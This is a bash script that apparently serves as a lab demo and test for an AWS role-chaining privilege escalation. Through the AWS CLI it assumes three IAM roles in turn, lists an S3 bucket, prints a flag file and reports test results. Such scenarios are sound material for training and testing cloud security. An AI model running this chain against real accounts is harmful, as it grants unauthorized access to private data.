#!/bin/bash

# Demo script for 3-hop role assumption chain attack
# This script demonstrates how to traverse the role chain to access the S3 bucket

set -e  # Exit on any error

# Configuration
PROFILE="pl-pathfinder-starting-user-prod"
REGION="us-west-2"

# Disable paging for AWS CLI
export AWS_PAGER=""

# Get the account ID from the profile
echo "🔍 Getting account ID from profile: $PROFILE"
ACCOUNT_ID=$(aws sts get-caller-identity --profile $PROFILE --query Account --output text)
echo "📋 Account ID: $ACCOUNT_ID"

# Role ARNs (these will be available as outputs from the Terraform module)
INITIAL_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-initial-role"
INTERMEDIATE_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-intermediate-role"
S3_ACCESS_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-s3-access-role"

echo ""
echo "🎯 Starting 3-hop role assumption chain attack..."
echo "=================================================="

# Step 1: Assume the initial role
echo ""
echo "🔄 Step 1: Assuming initial role..."
echo "Role ARN: $INITIAL_ROLE_ARN"

INITIAL_CREDENTIALS=$(aws sts assume-role \
    --profile $PROFILE \
    --role-arn $INITIAL_ROLE_ARN \
    --role-session-name "attack-initial-role" \
    --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]' \
    --output text)

INITIAL_ACCESS_KEY=$(echo $INITIAL_CREDENTIALS | cut -d' ' -f1)
INITIAL_SECRET_KEY=$(echo $INITIAL_CREDENTIALS | cut -d' ' -f2)
INITIAL_SESSION_TOKEN=$(echo $INITIAL_CREDENTIALS | cut -d' ' -f3)

echo "✅ Successfully assumed initial role"

# Step 2: Assume the intermediate role using the initial role's credentials
echo ""
echo "🔄 Step 2: Assuming intermediate role..."
echo "Role ARN: $INTERMEDIATE_ROLE_ARN"

INTERMEDIATE_CREDENTIALS=$(AWS_ACCESS_KEY_ID=$INITIAL_ACCESS_KEY \
    AWS_SECRET_ACCESS_KEY=$INITIAL_SECRET_KEY \
    AWS_SESSION_TOKEN=$INITIAL_SESSION_TOKEN \
    aws sts assume-role \
    --region $REGION \
    --role-arn $INTERMEDIATE_ROLE_ARN \
    --role-session-name "attack-intermediate-role" \
    --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]' \
    --output text)

INTERMEDIATE_ACCESS_KEY=$(echo $INTERMEDIATE_CREDENTIALS | cut -d' ' -f1)
INTERMEDIATE_SECRET_KEY=$(echo $INTERMEDIATE_CREDENTIALS | cut -d' ' -f2)
INTERMEDIATE_SESSION_TOKEN=$(echo $INTERMEDIATE_CREDENTIALS | cut -d' ' -f3)

echo "✅ Successfully assumed intermediate role"

# Step 3: Assume the S3 access role using the intermediate role's credentials
echo ""
echo "🔄 Step 3: Assuming S3 access role..."
echo "Role ARN: $S3_ACCESS_ROLE_ARN"

S3_CREDENTIALS=$(AWS_ACCESS_KEY_ID=$INTERMEDIATE_ACCESS_KEY \
    AWS_SECRET_ACCESS_KEY=$INTERMEDIATE_SECRET_KEY \
    AWS_SESSION_TOKEN=$INTERMEDIATE_SESSION_TOKEN \
    aws sts assume-role \
    --region $REGION \
    --role-arn $S3_ACCESS_ROLE_ARN \
    --role-session-name "attack-s3-access-role" \
    --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]' \
    --output text)

S3_ACCESS_KEY=$(echo $S3_CREDENTIALS | cut -d' ' -f1)
S3_SECRET_KEY=$(echo $S3_CREDENTIALS | cut -d' ' -f2)
S3_SESSION_TOKEN=$(echo $S3_CREDENTIALS | cut -d' ' -f3)

echo "✅ Successfully assumed S3 access role"

# Step 4: List contents of the S3 bucket
echo ""
# Get the actual bucket name by listing S3 buckets and finding the one with our prefix
BUCKET_NAME=$(AWS_ACCESS_KEY_ID=$S3_ACCESS_KEY \
    AWS_SECRET_ACCESS_KEY=$S3_SECRET_KEY \
    AWS_SESSION_TOKEN=$S3_SESSION_TOKEN \
    aws s3 ls | grep "pl-prod-role-chain-destination-" | awk '{print $3}' | head -1)
echo "🔄 Step 4: Listing contents of S3 bucket: $BUCKET_NAME"

AWS_ACCESS_KEY_ID=$S3_ACCESS_KEY \
    AWS_SECRET_ACCESS_KEY=$S3_SECRET_KEY \
    AWS_SESSION_TOKEN=$S3_SESSION_TOKEN \
    aws s3 ls s3://$BUCKET_NAME --region $REGION

# Step 5: Download and display the flag file
echo ""
echo "🔄 Step 5: Downloading and displaying flag.txt..."

AWS_ACCESS_KEY_ID=$S3_ACCESS_KEY \
    AWS_SECRET_ACCESS_KEY=$S3_SECRET_KEY \
    AWS_SESSION_TOKEN=$S3_SESSION_TOKEN \
    aws s3 cp s3://$BUCKET_NAME/flag.txt /tmp/flag.txt --region $REGION

echo ""
echo "📄 Flag file contents:"
echo "======================"
cat /tmp/flag.txt
echo "======================"

# Clean up the temporary file
rm -f /tmp/flag.txt

echo ""
echo "🎉 SUCCESS! Successfully traversed the 3-hop role assumption chain!"
echo "================================================================"
echo "📊 Attack Summary:"
echo "   - Started with profile: $PROFILE"
echo "   - Assumed initial role: $INITIAL_ROLE_ARN"
echo "   - Assumed intermediate role: $INTERMEDIATE_ROLE_ARN"
echo "   - Assumed S3 access role: $S3_ACCESS_ROLE_ARN"
echo "   - Accessed S3 bucket: $BUCKET_NAME"
echo "   - Downloaded and displayed flag.txt"
echo ""
echo "💡 This demonstrates a privilege escalation attack through role chaining!"
echo "   An attacker with minimal permissions can gain access to sensitive S3 data"
echo "   by exploiting the trust relationships between roles."

# Clean up environment variables
unset INITIAL_ACCESS_KEY INITIAL_SECRET_KEY INITIAL_SESSION_TOKEN
unset INTERMEDIATE_ACCESS_KEY INTERMEDIATE_SECRET_KEY INTERMEDIATE_SESSION_TOKEN

# Standardized test results output
echo "TEST_RESULT:prod_simple_explicit_role_assumption_chain:SUCCESS"
echo "TEST_DETAILS:prod_simple_explicit_role_assumption_chain:Successfully demonstrated role assumption chain with S3 access"
echo "TEST_METRICS:prod_simple_explicit_role_assumption_chain:roles_assumed=3,s3_access_gained=true,flag_retrieved=true"
unset S3_ACCESS_KEY S3_SECRET_KEY S3_SESSION_TOKEN
